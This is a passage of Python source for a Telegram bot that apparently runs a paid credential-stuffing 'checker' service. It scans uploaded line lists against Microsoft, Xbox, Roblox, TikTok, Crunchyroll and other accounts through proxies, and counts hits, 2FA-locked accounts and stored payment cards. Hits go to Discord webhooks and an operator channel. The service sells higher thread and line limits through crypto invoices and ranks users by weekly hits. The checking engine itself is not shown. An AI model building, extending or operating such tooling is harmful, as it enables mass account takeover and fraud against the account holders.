        [InlineKeyboardButton("🎯 Microsoft", callback_data="setmode_9")],
        [InlineKeyboardButton("🍥 Crunchyroll", callback_data="setmode_10")],
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def threads_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set threads shortcut"""
    db_user = get_or_create_user(update.effective_user.id)
    p = get_plan(db_user)
    context.user_data['state'] = 'set_threads'
    text = (
        f"🧵 *Set Thread Count*\n\n"
        f"*Limits by plan:*\n"
        f"🆓 Free: 100 | 📅 Weekly: 150 | 📅 Monthly: 200 | 📅 Yearly: 250\n\n"
        f"Your plan allows *100-{p['threads']}* threads.\n"
        f"Current: {db_user.current_threads}\n\n"
        f"Enter a number (min 100):\n"
        f"Cancel with /cancel"
    )
    await update.message.reply_text(text, parse_mode='Markdown')

async def keywords_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Keywords shortcut"""
    text = (
        "🔑 *Keyword Management*\n\n"
        "Keywords are searched within emails.\n"
        "Example: paypal, steam, amazon, netflix\n\n"
        "How would you like to add keywords?"
    )
    kb = [
        [InlineKeyboardButton("✏️ Manual Entry", callback_data="kw_manual")],
        [InlineKeyboardButton("📂 Upload File", callback_data="kw_upload")],
        [InlineKeyboardButton("📋 View List", callback_data="kw_view")],
        [InlineKeyboardButton("🗑️ Clear All", callback_data="kw_clear")],
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def linkmod_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Toggle link mode"""
    await update.message.reply_text("🔗 *Link Mode* is currently OFF.\n\nThis feature is coming soon!", parse_mode='Markdown')

async def lang_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Change language"""
    await update.message.reply_text("🌐 *Language* is currently set to English.\n\nMore languages coming soon!", parse_mode='Markdown')

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """My stats shortcut"""
    uid = update.effective_user.id
    db_user = get_or_create_user(uid)
    p = get_plan(db_user)
    rem = p["daily"] - db_user.daily_lines_used + db_user.daily_lines_bonus
    sr = (db_user.total_hits / max(db_user.total_lines_checked, 1)) * 100
    text = (
        f"📊 *Your Statistics*\n\n"
        f"👤 User ID: `{uid}`\n"
        f"📅 Registered: {db_user.created_at.strftime('%m/%d/%Y')}\n"
        f"👑 Membership: 📅 {db_user.plan.upper()}\n"
        f"📅 Expires: {db_user.plan_expires.strftime('%m/%d/%Y') if db_user.plan_expires else 'Never'}\n\n"
        f"📈 *Activity:*\n"
        f"✅ Total Scans: {db_user.total_scans:,}\n"
        f"💎 Total Hits: {db_user.total_hits:,}\n"
        f"📊 Total Lines: {db_user.total_lines_checked:,}\n"
        f"🎯 Success Rate: {sr:.2f}%\n"
        f"📊 Today's Scans: {db_user.daily_lines_used:,}\n"
        f"📊 Remaining Today: {fmt(max(0, rem))}\n\n"
        f"⚙️ *Configuration:*\n"
        f"🧵 Threads: {db_user.current_threads}\n"
        f"🔢 API Mode: {db_user.current_mode}\n"
        f"🔑 Keywords: {len(get_keywords(context, uid))}"
    )
    await update.message.reply_text(text, parse_mode='Markdown')

async def membership_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    db  = get_db()
    try:
        plans   = get_active_plans(db)
        db_user = get_or_create_user(uid)
        plan_icon = {"free":"🆓","weekly":"📅","monthly":"💎","yearly":"👑"}
        cur_icon  = plan_icon.get(db_user.plan, "📅")
        expires   = db_user.plan_expires.strftime("%d/%m/%Y") if db_user.plan_expires else "Never"

        header = f"👑 *Membership Plans*\n\nYour plan: {cur_icon} *{db_user.plan.upper()}* · expires {expires}\n\n"

        if not plans:
            await update.message.reply_text(header + "_No plans available yet._", parse_mode="Markdown")
            return

        lines = [header]
        kb    = []
        for p in plans:
            daily_str = "∞ daily" if p.daily_limit >= 999999 else f"{p.daily_limit:,}/day"
            lines.append(
                f"*{p.name}* — ${p.price_usd:.2f}\n"
                f"⏳ {p.duration_days} days · {daily_str} · 🧵 {p.threads} threads\n"
                f"{p.description}\n"
            )
            kb.append([InlineKeyboardButton(
                f"💳 Buy {p.name} — ${p.price_usd:.2f}",
                callback_data=f"buy_plan_{p.id}"
            )])

        kb.append([InlineKeyboardButton("🎟️ Redeem Coupon", callback_data="redeem_coupon")])
        await update.message.reply_text(
            "\n".join(lines), parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(kb)
        )
    finally:
        db.close()


async def myref_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """My referral shortcut"""
    uid = update.effective_user.id
    db_user = get_or_create_user(uid)
    bot_username = (await context.bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start={db_user.referral_code}"
    text = (
        f"🔗 *Your Referral Link:*\n"
        f"`{ref_link}`\n\n"
        f"📊 Referrals: {db_user.referral_count}\n"
        f"💰 Bonus: +{db_user.referral_count * REFERRAL_BONUS:,} lines\n\n"
        f"🎁 Earn +{REFERRAL_BONUS} lines per referral!"
    )
    await update.message.reply_text(text, parse_mode='Markdown')


# Alias for /referrals
referrals_cmd = myref_cmd

async def queue_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid     = update.effective_user.id
    db_user = get_or_create_user(uid)
    p       = get_plan(db_user)
    count        = len(active_scans)
    queue_length = max(0, count - MAX_QUEUE_FREE)
    can_skip     = not p.get("queue", True)
    est_wait     = queue_length * 45
    if can_skip:
        queue_status = "✅ *You skip the queue* — VIP benefit"
    else:
        queue_status = "⏳ *You wait in queue* — upgrade to skip instantly"
    wait_str = ("~" + str(est_wait) + "s") if queue_length > 0 else "No wait"
    text = (
        "📊 *Queue Status*\n\n"
        f"🔄 Active Scans: `{count}`\n"
        f"⏳ Waiting: `{queue_length}`\n"
        f"⏱️ Est. wait: `{wait_str}`\n\n"
        f"{queue_status}"
    )
    if not can_skip:
        text += "\n\n💎 *Upgrade to skip the queue:*\n/start → 👑 Membership"
    await update.message.reply_text(text, parse_mode="Markdown")


async def support_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Support shortcut"""
    text = (
        "📞 *Support & Contact*\n\n"
        "📱 Contact: @KansOrbit\n"
        "🔗 Link: https://t.me/KansOrbit\n\n"
        "💼 Developer: Orbit\n\n"
        "⚡ For custom features, bulk orders, or enterprise solutions, contact us directly!"
    )
    kb = [[InlineKeyboardButton("📞 Contact Support", url="https://t.me/KansOrbit")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

# ========== MAIN ==========

async def on_scan_progress(job, stats):
    """Called every 3s during scan — updates Telegram message."""
    try:
        from telegram import Bot
        bot = Bot(token=BOT_TOKEN)
        checked   = stats.get('checked', 0)
        total     = stats.get('total', 1)
        hits      = stats.get('hits', 0)
        bad       = stats.get('bad', 0)
        twofa     = stats.get('twofa', 0)
        errors    = stats.get('errors', 0)
        cpm       = stats.get('cpm', 0)
        xgpu      = stats.get('xgpu', 0)
        mc        = stats.get('minecraft', 0)
        pct       = (checked / max(total, 1)) * 100
        bar_len   = 10
        filled    = int(bar_len * pct / 100)
        bar       = '█' * filled + '░' * (bar_len - filled)

        if cpm >= 2000:    speed = '🟢 Excellent'
        elif cpm >= 500:   speed = '🟡 Good'
        elif cpm >= 100:   speed = '🟠 Slow'
        elif cpm > 0:      speed = '🔴 Bad Proxy'
        else:              speed = '⏳ Starting...'

        text = (
            f'⚡ *Checking in Progress*\n\n'
            f'`{bar}` {pct:.1f}%\n\n'
            f'✅ Checked: {checked:,}/{total:,}\n'
            f'💎 Hits: {hits:,}\n'
            f'🔒 2FA: {twofa:,}\n'
            f'❌ Bad: {bad:,}\n'
            f'⚠️ Errors: {errors:,}\n'
            f'🚀 CPM: {cpm:,}  {speed}\n'
        )
        if xgpu: text += f'⭐ XGPU: {xgpu:,}\n'
        if mc:   text += f'⛏️ MC: {mc:,}\n'

        await bot.edit_message_text(
            chat_id=job.chat_id,
            message_id=job.message_id,
            text=text,
            parse_mode='Markdown',
        )
    except Exception:
        pass


async def on_scan_hit(job, result: dict):
    """Real-time hit handler — Discord + batched Telegram alerts."""
    try:
        from core.database import get_db, User
        from core.smart_notifications import notif_manager

        def _get_user():
            with get_db() as db:
                return db.query(User).filter(User.telegram_id == job.user_id).first()

        user      = await asyncio.get_event_loop().run_in_executor(None, _get_user)
        custom_wh = user.discord_webhook if user else ''
        plan      = user.plan if user else 'free'

        # Discord webhook
        await discord_manager.send_hit(result, job.session_id, custom_wh, plan)

        # Batched Telegram hit notifications (VIP only — prevents spam)
        if plan in ('weekly', 'monthly', 'yearly'):
            await notif_manager.send_hit_batched(job.user_id, result, plan)

    except Exception as exc:
        logger.debug(f"on_scan_hit error: {exc}")


async def on_scan_complete(job, engine):
    """Called when scan finishes — sends results file + stats."""
    try:
        from telegram import Bot, InputFile
        from core.database import get_db, User, ScanSession
        import os

        bot   = Bot(token=BOT_TOKEN)
        stats = engine.get_stats()

        # Save results
        results_dir = f'results/{datetime.utcnow().strftime("%Y-%m-%d")}_{job.session_id[:8]}'
        files = engine.save_results_to_files(results_dir)

        # Update DB
        def _update_db():
            with get_db() as db:
                user = db.query(User).filter(User.telegram_id == job.user_id).first()
                if user:
                    user.total_scans         += 1
                    user.total_hits          += stats['hits']
                    user.total_lines_checked += stats['checked']
                    user.daily_lines_used    += stats['checked']
                scan = db.query(ScanSession).filter(ScanSession.session_id == job.session_id).first()
                if scan:
                    from datetime import datetime
                    scan.status       = 'completed'
                    scan.completed_at = datetime.utcnow()
                    scan.hits         = stats['hits']
                    scan.checked      = stats['checked']
                    scan.bad          = stats['bad']
                    scan.twofa        = stats['twofa']
                    scan.errors       = stats['errors']

        import asyncio
        await asyncio.get_event_loop().run_in_executor(None, _update_db)

        # Build summary
        hits    = stats['hits']
        checked = stats['checked']
        rate    = (hits / max(checked, 1)) * 100
        summary = (
            f'✅ *Scan Complete*\n\n'
            f'📄 File: `{job.filename}`\n'
            f'✅ Checked: {checked:,}\n'
            f'💎 Hits: {hits:,}\n'
            f'🔒 2FA: {stats["twofa"]:,}\n'
            f'❌ Bad: {stats["bad"]:,}\n'
            f'⚠️ Errors: {stats["errors"]:,}\n'
            f'🎯 Rate: {rate:.1f}%\n'
            f'🚀 Avg CPM: {stats["cpm"]:,}\n'
        )
        if stats.get('xgpu'):     summary += f'⭐ XGPU: {stats["xgpu"]:,}\n'
        if stats.get('xgp'):      summary += f'🎮 XGP: {stats["xgp"]:,}\n'
        if stats.get('minecraft'): summary += f'⛏️ MC: {stats["minecraft"]:,}\n'
        if stats.get('payment'):   summary += f'💳 Cards: {stats["payment"]:,}\n'

        # Edit progress message to show summary
        try:
            await bot.edit_message_text(
                chat_id=job.chat_id,
                message_id=job.message_id,
                text=summary,
                parse_mode='Markdown',
            )
        except Exception:
            await bot.send_message(job.chat_id, summary, parse_mode='Markdown')

        # Send result files
        for fpath in files[:10]:
            if os.path.exists(fpath) and os.path.getsize(fpath) > 0:
                try:
                    with open(fpath, 'rb') as f:
                        await bot.send_document(
                            chat_id=job.chat_id,
                            document=f,
                            filename=os.path.basename(fpath),
                        )
                except Exception:
                    pass

        # Send to results channel if configured
        from core.config import RESULTS_CHANNEL_ID
        if RESULTS_CHANNEL_ID and hits > 0:
            try:
                chan_msg = summary + f'\n👤 User: `{job.user_id}`'
                await bot.send_message(RESULTS_CHANNEL_ID, chan_msg, parse_mode='Markdown')
                # Send hits file to channel
                hits_file = os.path.join(results_dir, 'Hits.txt')
                if os.path.exists(hits_file):
                    with open(hits_file, 'rb') as f:
                        await bot.send_document(RESULTS_CHANNEL_ID, document=f, filename='Hits.txt')
            except Exception:
                pass

        # Discord admin notification
        await discord_manager.notify_scan_complete(job.user_id, job.session_id, stats, job.plan)

        # Cleanup old result files after 1 hour
        import threading
        def _cleanup():
            import time, shutil
            time.sleep(3600)
            try:
                shutil.rmtree(results_dir, ignore_errors=True)
            except Exception:
                pass
        threading.Thread(target=_cleanup, daemon=True).start()

    except Exception as exc:
        import logging
        logging.getLogger(__name__).error(f"on_scan_complete error: {exc}", exc_info=True)


# ═══════════════════════════════════════════════════════════
# New Commands
# ═══════════════════════════════════════════════════════════

_BOT_START_TIME = datetime.utcnow()

async def mystats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Personal stats card — detailed breakdown."""
    uid     = update.effective_user.id
    db_user = get_or_create_user(uid)
    p       = get_plan(db_user)

    # Weekly stats from DB
    db = get_db()
    try:
        from sqlalchemy import func
        week_ago = datetime.utcnow() - timedelta(days=7)
        weekly = db.query(
            func.sum(ScanSession.hits).label('hits'),
            func.sum(ScanSession.checked).label('checked'),
            func.count(ScanSession.id).label('scans'),
        ).filter(
            ScanSession.user_id == uid,
            ScanSession.started_at >= week_ago,
            ScanSession.status == 'completed',
        ).first()

        # All-time rank
        all_ranks = db.query(
            ScanSession.user_id,
            func.sum(ScanSession.hits).label('h'),
        ).filter(
            ScanSession.status == 'completed'
        ).group_by(ScanSession.user_id).order_by(
            func.sum(ScanSession.hits).desc()
        ).all()
        rank = next((i+1 for i, r in enumerate(all_ranks) if r.user_id == uid), None)
    finally:
        db.close()

    plan_icon = {'free':'🆓','weekly':'📅','monthly':'💎','yearly':'👑'}.get(db_user.plan,'📅')
    expires   = db_user.plan_expires.strftime('%m/%d/%Y') if db_user.plan_expires else 'Never'
    sr_total  = (db_user.total_hits / max(db_user.total_lines_checked, 1)) * 100
    rem       = p['daily'] - db_user.daily_lines_used + db_user.daily_lines_bonus

    w_hits    = weekly.hits    or 0 if weekly else 0
    w_checked = weekly.checked or 0 if weekly else 0
    w_scans   = weekly.scans   or 0 if weekly else 0
    w_rate    = (w_hits / max(w_checked, 1)) * 100

    text = (
        f"📊 *My Stats*\n\n"
        f"{plan_icon} *{db_user.plan.upper()}* · expires {expires}\n\n"
        f"*All Time*\n"
        f"✅ Scans: `{db_user.total_scans:,}`\n"
        f"💎 Hits: `{db_user.total_hits:,}`\n"
        f"📋 Checked: `{db_user.total_lines_checked:,}`\n"
        f"🎯 Hit Rate: `{sr_total:.2f}%`\n"
        f"{'🏆 Rank: #' + str(rank) if rank else ''}\n\n"
        f"*This Week*\n"
        f"✅ Scans: `{w_scans:,}`\n"
        f"💎 Hits: `{w_hits:,}`\n"
        f"📋 Checked: `{w_checked:,}`\n"
        f"🎯 Rate: `{w_rate:.2f}%`\n\n"
        f"*Today*\n"
        f"📤 Used: `{db_user.daily_lines_used:,}`\n"
        f"📥 Remaining: `{fmt(max(0, rem))}`\n"
        f"🎁 Bonus: `{db_user.daily_lines_bonus:,}`"
    )
    await update.message.reply_text(text, parse_mode='Markdown')



async def history_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    db  = get_db()
    try:
        sessions = db.query(ScanSession).filter(
            ScanSession.user_id == uid
        ).order_by(ScanSession.started_at.desc()).limit(5).all()
        if not sessions:
            await update.message.reply_text("📭 No scan history yet.")
            return
        MODE_NAMES = {1:'All-in-One',2:'Supercell',3:'Roblox',4:'Xbox',5:'TikTok',
                      6:'Full Scan',7:'Speed',8:'Minecraft',9:'Microsoft',10:'Crunchyroll'}
        out = ["📜 *Your Last Scans*\n"]
        for i, s in enumerate(sessions, 1):
            rate = (s.hits / max(s.checked, 1)) * 100
            date = s.started_at.strftime('%m/%d %H:%M') if s.started_at else '?'
            mname = MODE_NAMES.get(s.mode, f'Mode {s.mode}')
            icon  = '✅' if s.status == 'completed' else ('⚡' if s.status == 'running' else '⏹️')
            out.append(
                f"{icon} *#{i}* `{date}`\n"
                f"   {mname} | `{s.checked:,}` checked\n"
                f"   💎 `{s.hits:,}` hits ({rate:.1f}%)"
            )
        await update.message.reply_text("\n".join(out), parse_mode='Markdown')
    finally:
        db.close()


async def leaderboard_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    db  = get_db()
    try:
        week_ago = datetime.utcnow() - timedelta(days=7)
        from sqlalchemy import func

        rows = db.query(
            ScanSession.user_id,
            func.sum(ScanSession.hits).label('total_hits'),
            func.sum(ScanSession.checked).label('total_checked'),
            func.count(ScanSession.id).label('scan_count'),
        ).filter(
            ScanSession.started_at >= week_ago,
            ScanSession.status == 'completed',
        ).group_by(ScanSession.user_id).order_by(
            func.sum(ScanSession.hits).desc()
        ).limit(10).all()

        if not rows:
            await update.message.reply_text(
                "📭 *No Results Yet*\n\nBe the first on the leaderboard this week!",
                parse_mode='Markdown'
            )
            return

        # Personal rank
        all_ranks = db.query(
            ScanSession.user_id,
            func.sum(ScanSession.hits).label('h'),
        ).filter(
            ScanSession.started_at >= week_ago,
            ScanSession.status == 'completed',
        ).group_by(ScanSession.user_id).order_by(
            func.sum(ScanSession.hits).desc()
        ).all()
        my_rank   = next((i+1 for i, r in enumerate(all_ranks) if r.user_id == uid), None)

        medals     = ['🥇','🥈','🥉','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣','🔟']
        plan_icons = {'free':'🆓','weekly':'📅','monthly':'💎','yearly':'👑'}

        lines = ["🏆 *Weekly Leaderboard*", "_Names hidden · Resets Monday_", ""]

        for i, row in enumerate(rows):
            u       = db.query(User).filter(User.telegram_id == row.user_id).first()
            raw     = u.username if (u and u.username) else f"user{str(row.user_id)[-4:]}"
            masked  = _mask_name(raw)
            plan_ic = plan_icons.get(u.plan if u else 'free', '🆓')
            rate    = (row.total_hits / max(row.total_checked, 1)) * 100
            crown   = " 👑" if i == 0 else ""
            lines.append(
                f"{medals[i]} {plan_ic} `{masked}`{crown}\n"
                f"   💎 `{row.total_hits:,}` hits · {rate:.1f}% · {row.scan_count} scans"
            )

        lines.append("")
        if my_rank and my_rank <= 10:
            lines.append(f"_You are #{my_rank} this week_ 🎉")
        elif my_rank:
            lines.append(f"_Your rank: #{my_rank} — keep scanning!_")
        else:
            lines.append("_Scan to appear on the leaderboard_")

        await update.message.reply_text("\n".join(lines), parse_mode='Markdown')
    finally:
        db.close()


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ps     = global_proxy_manager.stats()
    uptime = datetime.utcnow() - _BOT_START_TIME
    db     = get_db()
    try:
        total  = db.query(User).count()
        active = db.query(User).filter(
            User.last_active >= datetime.utcnow() - timedelta(hours=24)
        ).count()
    finally:
        db.close()
    try:
        import psutil
        cpu  = psutil.cpu_percent(interval=0.5)
        mem  = psutil.virtual_memory()
        sys_line = f"💻 CPU: `{cpu}%` | RAM: `{mem.percent}%`\n"
    except Exception:
        sys_line = ""
    days  = uptime.days
    hours = uptime.seconds // 3600
    mins  = (uptime.seconds % 3600) // 60
    text  = (
        f"🟢 *Bot Status*\n\n"
        f"⏱️ Uptime: `{days}d {hours}h {mins}m`\n"
        f"👥 Users: `{total:,}` | Active 24h: `{active:,}`\n"
        f"⚡ Active Scans: `{len(active_scans)}`\n\n"
        f"🌐 Proxies: `{ps['available']}`/`{ps['total']}` "
        f"({ps['success_rate']:.0f}% OK)\n"
        f"{sys_line}"
    )
    await update.message.reply_text(text, parse_mode='Markdown')


async def setwebhook_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid     = update.effective_user.id
    db_user = get_or_create_user(uid)
    p       = get_plan(db_user)
    if not p.get('discord_webhook', False):
        await update.message.reply_text(
            "🔒 *Custom Webhook — Monthly/Yearly VIP only*\n\n"
            "Upgrade: /start → 👑 Membership",
            parse_mode='Markdown'
        )
        return
    if not context.args:
        cur = db_user.discord_webhook or 'Not set'
        await update.message.reply_text(
            f"🔗 Current: `{cur}`\n\nUsage: `/setwebhook URL`\nClear: `/setwebhook clear`",
            parse_mode='Markdown'
        )
        return
    url = context.args[0].strip()
    if url.lower() == 'clear':
        db = get_db()
        try:
            u = db.query(User).filter(User.telegram_id == uid).first()
            if u: u.discord_webhook = None
            db.commit()
        finally:
            db.close()
        await update.message.reply_text("✅ Webhook cleared.")
        return
    if not url.startswith('https://discord.com/api/webhooks/'):
        await update.message.reply_text("❌ Must be a Discord webhook URL.")
        return
    db = get_db()
    try:
        u = db.query(User).filter(User.telegram_id == uid).first()
        if u: u.discord_webhook = url[:256]
        db.commit()
    finally:
        db.close()
    await update.message.reply_text("✅ Discord webhook saved! Hits will be sent there in real-time.", parse_mode='Markdown')


async def givebonus_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: `/givebonus USER_ID AMOUNT`", parse_mode='Markdown')
        return
    try:
        tid    = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid args.")
        return
    db = get_db()
    try:
        u = db.query(User).filter(User.telegram_id == tid).first()
        if not u:
            await update.message.reply_text("❌ User not found.")
            return
        u.daily_lines_bonus += amount
        db.commit()
        await update.message.reply_text(
            f"✅ Given `{amount:,}` bonus lines to `{tid}`",
            parse_mode='Markdown'
        )
        try:
            await context.bot.send_message(
                tid,
                f"🎁 *Bonus!* An admin gave you `{amount:,}` bonus lines!",
                parse_mode='Markdown'
            )
        except Exception:
            pass
    finally:
        db.close()


async def clearqueue_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: clear all stuck/zombie scans from queue."""
    if not is_admin(update.effective_user.id):
        return
    killed = 0
    for uid, engine in list(active_scans.items()):
        try:
            engine.stop()
            del active_scans[uid]
            killed += 1
        except Exception:
            pass
    db = get_db()
    try:
        from core.database import ScanSession
        stuck = db.query(ScanSession).filter(ScanSession.status == 'running').all()
        for s in stuck:
            s.status = 'stopped'
        db.commit()
        db_cleared = len(stuck)
    finally:
        db.close()
    await update.message.reply_text(
        f"🧹 *Queue Cleared*\n\n"
        f"⚡ Active scans killed: `{killed}`\n"
        f"🗄️ DB sessions marked stopped: `{db_cleared}`",
        parse_mode='Markdown'
    )



async def announce_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text("Usage: `/announce Your message here`", parse_mode='Markdown')
        return
    msg_text = ' '.join(context.args)
    styled   = msg_text  # plain message, no header
    db = get_db()
    try:
        tids = [u.telegram_id for u in db.query(User).filter(User.is_banned == False).all()]
    finally:
        db.close()
    sent = 0
    failed = 0
    prog = await update.message.reply_text(f"📢 Sending to {len(tids):,} users...")
    for tid in tids:
        try:
            await context.bot.send_message(tid, styled, parse_mode='Markdown')
            sent += 1
        except Exception:
            failed += 1
        if sent % 50 == 0:
            try:
                await prog.edit_text(f"📢 {sent:,}/{len(tids):,} sent...")
            except Exception:
                pass
        await asyncio.sleep(0.05)
    await prog.edit_text(
        f"✅ *Sent!*\n\n✅ `{sent:,}` delivered | ❌ `{failed:,}` failed",
        parse_mode='Markdown'
    )


async def topmode_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show which checker mode has best hit rate this week."""
    db = get_db()
    try:
        from sqlalchemy import func
        week_ago = datetime.utcnow() - timedelta(days=7)
        rows = db.query(
            ScanSession.mode,
            func.sum(ScanSession.hits).label('total_hits'),
            func.sum(ScanSession.checked).label('total_checked'),
            func.count(ScanSession.id).label('scan_count'),
        ).filter(
            ScanSession.started_at >= week_ago,
            ScanSession.status == 'completed',
            ScanSession.checked > 0,
        ).group_by(ScanSession.mode).all()

        if not rows:
            await update.message.reply_text("📭 No data yet this week.")
            return

        MODE_NAMES = {
            1:'🔥 All-in-One', 2:'🎮 Supercell', 3:'🎮 Roblox',
            4:'🎮 Xbox',       5:'📱 TikTok',    6:'📊 Full Scan',
            7:'🚀 Speed',      8:'⛏️ Minecraft', 9:'🎯 Microsoft',
            10:'🍥 Crunchyroll',
        }

        rows_sorted = sorted(rows, key=lambda r: (r.total_hits / max(r.total_checked, 1)), reverse=True)

        lines = ["📈 *Top Modes This Week*\n"]
        for i, row in enumerate(rows_sorted[:8], 1):
            rate  = (row.total_hits / max(row.total_checked, 1)) * 100
            mname = MODE_NAMES.get(row.mode, f'Mode {row.mode}')
            bar   = '█' * int(rate / 10) + '░' * (10 - int(rate / 10))
            lines.append(
                f"*{i}.* {mname}\n"
                f"   `{bar}` {rate:.1f}%  💎 {row.total_hits:,} / {row.total_checked:,}"
            )

        await update.message.reply_text("\n".join(lines), parse_mode='Markdown')
    finally:
        db.close()



def get_active_plans(db):
    return db.query(Plan).filter(Plan.is_active == True).order_by(Plan.price_usd).all()


async def activate_plan_for_user(user_id: int, plan_name: str):
    db = get_db()
    try:
        db_user = db.query(User).filter(User.telegram_id == user_id).first()
        plan    = db.query(Plan).filter(Plan.name == plan_name).first()
        if not db_user or not plan:
            return
        db_user.plan         = plan_name.lower().replace(' ', '_')
        db_user.plan_expires = datetime.utcnow() + timedelta(days=plan.duration_days)
        db_user.current_threads = plan.threads
        db.commit()
    except Exception as e:
        logger.error(f"activate_plan_for_user: {e}")
    finally:
        db.close()


def apply_coupon(db, code: str, user_id: int):
    code = code.strip().upper()
    c = db.query(Coupon).filter(Coupon.code == code, Coupon.is_active == True).first()
    if not c:
        return 0, 0, None, "❌ Invalid coupon code."
    if c.max_uses and c.uses >= c.max_uses:
        return 0, 0, None, "❌ Coupon has reached max uses."
    if c.expires_at and datetime.utcnow() > c.expires_at:
        return 0, 0, None, "❌ Coupon has expired."
    c.uses += 1
    db.commit()
    return c.discount_pct, c.free_days, c.plan_id, None


async def _handle_buy_plan(update: Update, context: ContextTypes.DEFAULT_TYPE, plan_id: int):
    """OxaPay purchase flow for a specific plan."""
    uid   = update.effective_user.id
    query = update.callback_query

    db = get_db()
    try:
        plan = db.query(Plan).filter(Plan.id == plan_id, Plan.is_active == True).first()
        if not plan:
            await query.answer("Plan not found.", show_alert=True)
            return

        # Check for pending coupon in context
        coupon_code = context.user_data.pop('pending_coupon', None)
        discount    = 0
        free_days   = 0
        coupon_err  = None

        if coupon_code:
            discount, free_days, cpn_plan_id, coupon_err = apply_coupon(db, coupon_code, uid)
            if coupon_err:
                await query.answer(coupon_err, show_alert=True)
                return
            # If coupon gives full plan free
            if discount >= 100 or (cpn_plan_id and cpn_plan_id == plan_id):
                total_days = plan.duration_days + free_days
                await activate_plan_for_user(uid, plan.name)
                await query.message.reply_text(
                    f"🎉 *Coupon applied — Plan FREE!*\n\n"
                    f"✅ *{plan.name}* activated for {total_days} days!",
                    parse_mode='Markdown'
                )
                return

        final_price = round(plan.price_usd * (1 - discount / 100), 2)

        if not OXAPAY_MERCHANT:
            await query.message.reply_text(
                "⚠️ *Payment not configured.*\n\nAdmin: set OXAPAY_MERCHANT in .env",
                parse_mode='Markdown'
            )
            return

        await query.answer("Creating invoice...")
        await query.message.reply_text("⏳ Creating payment invoice...", parse_mode='Markdown')

        import secrets
        order_id = f"orbit_{uid}_{plan_id}_{secrets.token_hex(4)}"
        invoice  = await create_invoice(
            merchant_key  = OXAPAY_MERCHANT,
            amount_usd    = final_price,
            description   = f"Orbit {plan.name} - {plan.duration_days} days",
            order_id      = order_id,
            lifetime_min  = 30,
        )

        if not invoice:
            await query.message.reply_text("❌ Failed to create invoice. Try again.")
            return

        # Save payment record
        payment = Payment(
            user_id    = uid,
            plan_id    = plan_id,
            plan_name  = plan.name,
            amount_usd = final_price,
            coupon_code= coupon_code,
            discount_pct = discount,
            track_id   = invoice['track_id'],
            pay_link   = invoice['pay_link'],
            status     = 'pending',
        )
        db.add(payment)
        db.commit()

        discount_line = f"\n🎟️ Coupon: `-{discount}%` (was ${plan.price_usd:.2f})" if discount else ""
        await query.message.reply_text(
            f"💳 *Payment Invoice Created*\n\n"
            f"📦 Plan: *{plan.name}*\n"
            f"⏳ Duration: *{plan.duration_days} days*\n"
            f"💰 Amount: *${final_price:.2f}*{discount_line}\n\n"
            f"⏱️ Invoice expires in 30 minutes\n\n"
            f"👇 Click Pay and complete payment — plan activates automatically:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("💳 Pay Now", url=invoice['pay_link'])
            ]])
        )

        # Poll for payment confirmation in background
        asyncio.create_task(poll_payment(
            merchant_key     = OXAPAY_MERCHANT,
            track_id         = invoice['track_id'],
            bot              = context.bot,
            user_id          = uid,
            plan_name        = plan.name,
            on_paid_callback = activate_plan_for_user,
            timeout_min      = 30,
        ))

    finally:
        db.close()


async def redeem_coupon_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prompt user to enter a coupon code."""
    context.user_data['state'] = 'waiting_coupon'
    await update.message.reply_text(
        "🎟️ *Redeem Coupon*\n\nSend your coupon code:",
        parse_mode='Markdown'
    )


# ── Admin plan management commands ────────────────────────────────────────────

async def createplan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /createplan Name Price Days [Threads] [DailyLimit] [Description]"""
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) < 3:
        await update.message.reply_text(
            "*Usage:*\n"
            "`/createplan Name Price Days [Threads] [DailyLimit] [Description]`\n\n"
            "*Examples:*\n"
            "`/createplan Weekly 5 7 150 15000 Basic weekly plan`\n"
            "`/createplan Monthly 15 30 200 0 Unlimited monthly`\n"
            "`/createplan Yearly 50 365 250 0 Full yearly access`",
            parse_mode='Markdown'
        )
        return
    try:
        name        = context.args[0]
        price       = float(context.args[1])
        days        = int(context.args[2])
        threads     = int(context.args[3]) if len(context.args) > 3 else 200
        daily_limit = int(context.args[4]) if len(context.args) > 4 else 999999
        if daily_limit == 0:
            daily_limit = 999999
        description = ' '.join(context.args[5:]) if len(context.args) > 5 else ''

        db = get_db()
        try:
            existing = db.query(Plan).filter(Plan.name == name).first()
            if existing:
                existing.price_usd    = price
                existing.duration_days= days
                existing.threads      = threads
                existing.daily_limit  = daily_limit
                existing.description  = description
